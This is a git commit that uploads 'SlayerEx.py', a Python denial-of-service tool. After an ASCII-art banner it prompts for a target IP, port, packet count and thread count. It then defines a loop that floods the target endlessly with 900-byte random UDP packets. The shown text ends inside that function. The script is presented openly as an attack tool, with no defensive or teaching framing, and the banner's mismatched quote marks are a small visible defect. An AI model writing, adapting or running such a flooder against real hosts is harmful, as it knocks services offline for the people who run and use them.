787e9b84b49d3b850f3aa143aae24f70463ea024
Luc1fer2X <109740334+Luc1fer2X@users.noreply.github.com>
2022-07-21 19:50:14 +0700

    Add files via upload

---
+++ SlayerEx.py
@@ -0,0 +1,58 @@
+#Autor By Luc1fer
+import random
+import socket
+import threading
+import os
+import time
+import sys
+
+os.system("clear")
+print('''
+⡀                                             ⡄
+⢻⣦⡀              ⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀            ⢀⣠⣾⠁
+ ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁    ⠚⢯⠟⠂    ⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃ 
+  ⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒ ⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉   
+       ⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄           ⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄       
+      ⢠⡞⠁  ⡠⢾⣿⣿⣯ ⠈⢧⡀       ⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄ ⢀⡘⣦⡀     
+     ⣰⣟⣟⣿⣀⠎  ⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎  ⠱⣤⢿⠿⢷⡀    
+    ⣰⠋ ⠘⣡⠃   ⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏ ⡼    ⠘⢆  ⢹⡄   
+   ⢰⠇  ⣰⠃  ⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟ ⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀ ⠈⢆  ⢳   
+   ⡟  ⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋ ⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄ ⠈⣇  
+  ⢸⠃ ⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏  ⢹  
+  ⢸   ⡇ ⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀ ⣘⣷⠇ ⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉   ⢸  ⢸⡆ 
+  ⢸   ⡇    ⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛ ⢴⣿⢿⡟⣿⣿⣿⣿ ⠙⠲⢤⡀   ⢸⡀ ⢸⡇ 
+  ⢸⣀⣷⣾⣇ ⣠⠴⠋⠁  ⣿⣿⡛⣿⡇⢻⡿⢟⠁  ⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁ 
+  ⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅ ⢿⡿⠦ ⠁ ⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉ ⠈⠁⢈⡇⠈⠇⣼  
+   ⢳   ⢧      ⠈⢿⣿⣷⣌⠧⡀⢲⠄  ⢴⠃⢠⢋⣴⣿⣿⠏       ⡸  ⢠⠇  
+   ⠈⢧  ⠈⢦      ⠈⠻⣿⣿⣧⠐⠸⡄⢠ ⢸ ⢠⣿⣟⡿⠋       ⡰⠁ ⢀⡟   
+    ⠈⢧   ⠣⡀      ⠈⠛⢿⡇⢰⠁⠸⠄⢸ ⣾⠟⠉       ⢀⠜⠁ ⢀⡞    
+     ⠈⢧⡀  ⠙⢄       ⢨⡷⣜   ⠘⣆⢻        ⡴⠋  ⣠⠎     
+       ⠑⢄   ⠑⠦⣀    ⠈⣷⣿⣦⣤⣤⣾⣿⢾     ⣀⠴⠋  ⢀⡴⠃      
+        ⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆ ⢀⡴⠋        
+           ⠉⠳⢽⡁    ⠈⠉⠙⣿⠿⢿⢿⠍⠉    ⠉⣻⡯⠛⠁          
+              ⠈⠑⠲⠤⣀⣀⡀ ⠈⣽⡟⣼ ⣀⣀⣠⠤⠒⠋⠁             
+                    ⠉⠉⠉⢻⡏⠉⠉⠁                   
+                       ⠈
+""")
+
+print(" SlayerEx DDoS+")
+print(" Tolls Have Problem? Message Me")
+print(" #Tolls By Luc1fer#")
+ip = str(input(" Send IP:"))
+port = int(input(" Port:"))
+choice = str(input(" Attack?(y/n):"))
+times = int(input(" Packets?:"))
+threads = int(input(" Threads?:"))
+
+def run():
+	data = random._urandom(900)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Attack!!!")
+		except:
+			print("[!] Down!!!")
